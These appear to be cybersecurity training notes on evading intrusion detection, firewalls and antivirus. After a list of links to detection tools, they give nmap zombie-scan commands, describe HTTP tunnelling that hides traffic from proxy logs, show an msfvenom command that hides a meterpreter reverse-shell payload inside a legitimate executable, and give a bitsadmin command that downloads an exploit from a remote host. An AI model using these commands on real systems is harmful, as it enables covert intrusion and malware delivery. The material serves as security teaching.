# Module 12

## Evading IDS, antivirus and Honeypots
Intrusion Detection Systems (IDS) add a critical security layer, making them prime targets. Attackers use sophisticated evasion techniques to bypass detection and compromise the infrastructure. Similarly, firewalls relying on predefined rules can be tricked by skilled attackers using various bypass methods to allow malicious traffic to pass unfiltered.

---

### 1. Intrusion Detection using various tools
The goal of the Intrusion Detection Analyst is to find possible attacks against a network.

#### 1.1 Detect Intrusion using snort
[Snort - Network Intrusion Detection & Prevention System](https://www.snort.org/)

#### 1.2 Detect Malicious traffic with Zone alarm free firewall
[ZoneAlarm Free Firewall](https://www.zonealarm.com/software/free-firewall)

#### 1.3 Detect Malicious traffic using HoneyBot
[HoneyBot](https://honeybot.software.informer.com)

#### 1.4 Deploy Cowrie Honeypot to Detect Malicious Network Traffic
Cowrie serves as an SSH and Telnet honeypot, capable of capturing brute-force attacks and the actions taken by attackers within the shell.
[GitHub - cowrie/cowrie: Cowrie SSH/Telnet Honeypot https://cowrie.readthedocs.io](https://github.com/cowrie/cowrie)

---

### 2. Evade Firewall using Evasion Techniques
<img width="428" height="575" alt="image" src="https://github.com/user-attachments/assets/a333df1e-0c81-4fb8-8f58-7872bb5c2bac" />

### 2.1 Bypass firewall using Nmap
Add a rule in windows firewall to block all traffic from the attacking machine.
In Ping sweep, the host will appear as online
- `nmap -sP 192.168.18.0/24`
Zombie scan can bypass the firewall rule
- `nmap -sI 192.168.18.2 192.168.18.11`  192.168.18.11 is the target

#### 2.2 Bypass firewall rules using HTTP/ FTP Tunneling 
HTTPort is a tool that bypasses restrictive HTTP proxies. It tunnels blocked traffic (like email or FTP) through an allowed HTTP connection.

**It works by**:
1. Sending data to a remote server (HTTHost) outside the blocked network using a series of HTTP requests.
2. The proxy sees this as normal web surfing and allows it.
3. The HTTHost server then forwards the traffic to the intended destination.
> This method is reliable and features strong encryption, making proxy logs useless.
[HTTPort, secure TCP through HTTP tunneling](https://www.targeted.org/htthost/)

#### 2.3 Bypass antivirus using metasploit templates
Attackers use msfvenom with the -x flag to embed a malicious payload into a legitimate, trusted executable file (like calc.exe). This tricks antivirus software into seeing the file as safe because it recognizes the trusted program's signature, allowing the hidden payload to bypass detection.

**How It's Done**
1. Acquire a Legitimate Template: Find a clean, signed executable from a trusted source. This will be your new template.
2. Inject the Payload: Use msfvenom to inject your malicious Metasploit payload (e.g., a reverse shell) into this legitimate executable.
3. The Bypass: The resulting file has the digital signature and code structure of the trusted software, but contains your hidden payload. AV is less likely to flag it because it appears to be a known-good program.

**Basic msfvenom Command**
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -x /path/to/legitimate_file.exe -k -f exe -o malicious_output.exe`
  - `-x /path/to/legitimate_file.exe`: Specifies your clean template.
  - `-k`: Tells Metasploit to preserve the template's original functionality alongside the payload. The legitimate program will still run to avoid suspicion.

---

#### 2.4 Bypass firewall using windows BITSAdmin
The utilty can be used to transfer files in windows command prompt.    
BITS (Background Intelligent Transfer Service) is an essential component of Windows XP and later versions of Windows operating systems. BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress.
bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe

---
---
